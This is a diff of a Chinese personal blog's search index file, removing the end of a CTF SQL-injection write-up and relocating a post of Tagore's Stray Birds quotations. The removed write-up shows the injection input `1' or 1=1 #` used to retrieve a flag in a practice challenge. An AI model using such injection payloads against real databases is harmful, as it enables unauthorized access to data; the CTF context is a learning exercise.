-<p>改好后再通过这个语句查询：<br><code>1&#39; or 1=1 #</code><br>即可获得flag</p>
-</li>
-</ul>
-<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>好好学习，天天向上</p>
-<h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><p><a href="https://blog.csdn.net/Mr_helloword/article/details/107935479">攻防世界-supersqli详解</a></p>
-]]></content>
-      <categories>
-        <category>CTF</category>
-        <category>SQL注入</category>
-      </categories>
-      <tags>
-        <tag>CTF</tag>
-        <tag>SQL注入</tag>
-        <tag>堆叠注入</tag>
       </tags>
   </entry>
   <entry>
@@ -7601,30 +7698,6 @@ secure_file_priv 一栏的value为空，即是成功</li>
       </tags>
   </entry>
   <entry>
-    <title>飞鸟集--摘抄</title>
-    <url>/2022/11/18/%E9%A3%9E%E9%B8%9F%E9%9B%86_%E6%91%98%E6%8A%84/</url>
-    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>最近突然想起了泰戈尔的飞鸟集里的一些诗，来了兴致，便又重读了飞鸟集，不由得感叹，诗真美啊。这样的美，大概是永恒吧。</p>
-<span id="more"></span>
-<h1 id="喜欢的句子"><a href="#喜欢的句子" class="headerlink" title="喜欢的句子"></a>喜欢的句子</h1><ol>
-<li>It is the tears of the earth that keep here smiles in bloom.<br>是大地的泪点，使她的微笑保持着青春不谢。</li>
-<li>If you shed tears when you miss the sun, you also miss the stars.<br>如果你因失去了太阳而流泪，那么你也将失去群星了。</li>
-<li>Her wishful face haunts my dreams like the rain at night.<br>她的热切的脸，如夜雨似的，搅扰着我的梦魂。</li>
-<li>Sorrow is hushed into peace in my heart like the evening among the silent trees.<br>忧思在我的心里平静下去，正如暮色降临在寂静的山林中。</li>
-<li>Do not seat your love upon a precipice because it is high.<br>不要因为峭壁是高的，便让你的爱情坐在峭壁上。</li>
-<li>What you are you do not see, what you see is your shadow.<br>你看不见你自己，你所看见的只是你的影子。</li>
-<li>His own mornings are new surprises to God.<br>神自己的清晨，在他自己看来也是新奇的。</li>
-</ol>
-<p>未完待续…</p>
-<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>曾经听说，所有的作家最初都想成为诗人。<br>诗人，将“美”用文字记录下来，成为了永恒的“美”。<br>让能够理解这样的“美”的人，去跨时代，跨地域，跨文化与诗人产生灵魂的碰撞！</p>
-]]></content>
-      <categories>
-        <category>摘抄</category>
-      </categories>
-      <tags>
-        <tag>诗</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>赛博朋克~边缘行者--渺小个人的癫狂悲剧</title>
     <url>/2022/11/19/%E8%B5%9B%E5%8D%9A%E6%9C%8B%E5%85%8B%E5%8A%A8%E7%94%BB/</url>
     <content><![CDATA[<p><img src="/images/Cyberpunk.png" alt="Cyberpunk"></p>
@@ -7656,6 +7729,30 @@ secure_file_priv 一栏的value为空，即是成功</li>
       </categories>
       <tags>
         <tag>动画</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>飞鸟集--摘抄</title>
+    <url>/2022/11/18/%E9%A3%9E%E9%B8%9F%E9%9B%86_%E6%91%98%E6%8A%84/</url>
+    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>最近突然想起了泰戈尔的飞鸟集里的一些诗，来了兴致，便又重读了飞鸟集，不由得感叹，诗真美啊。这样的美，大概是永恒吧。</p>
+<span id="more"></span>
+<h1 id="喜欢的句子"><a href="#喜欢的句子" class="headerlink" title="喜欢的句子"></a>喜欢的句子</h1><ol>
+<li>It is the tears of the earth that keep here smiles in bloom.<br>是大地的泪点，使她的微笑保持着青春不谢。</li>
+<li>If you shed tears when you miss the sun, you also miss the stars.<br>如果你因失去了太阳而流泪，那么你也将失去群星了。</li>
+<li>Her wishful face haunts my dreams like the rain at night.<br>她的热切的脸，如夜雨似的，搅扰着我的梦魂。</li>
+<li>Sorrow is hushed into peace in my heart like the evening among the silent trees.<br>忧思在我的心里平静下去，正如暮色降临在寂静的山林中。</li>
+<li>Do not seat your love upon a precipice because it is high.<br>不要因为峭壁是高的，便让你的爱情坐在峭壁上。</li>
+<li>What you are you do not see, what you see is your shadow.<br>你看不见你自己，你所看见的只是你的影子。</li>
+<li>His own mornings are new surprises to God.<br>神自己的清晨，在他自己看来也是新奇的。</li>
+</ol>
+<p>未完待续…</p>
+<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>曾经听说，所有的作家最初都想成为诗人。<br>诗人，将“美”用文字记录下来，成为了永恒的“美”。<br>让能够理解这样的“美”的人，去跨时代，跨地域，跨文化与诗人产生灵魂的碰撞！</p>
+]]></content>
+      <categories>
+        <category>摘抄</category>
+      </categories>
+      <tags>
+        <tag>诗</tag>
       </tags>
   </entry>
   <entry>
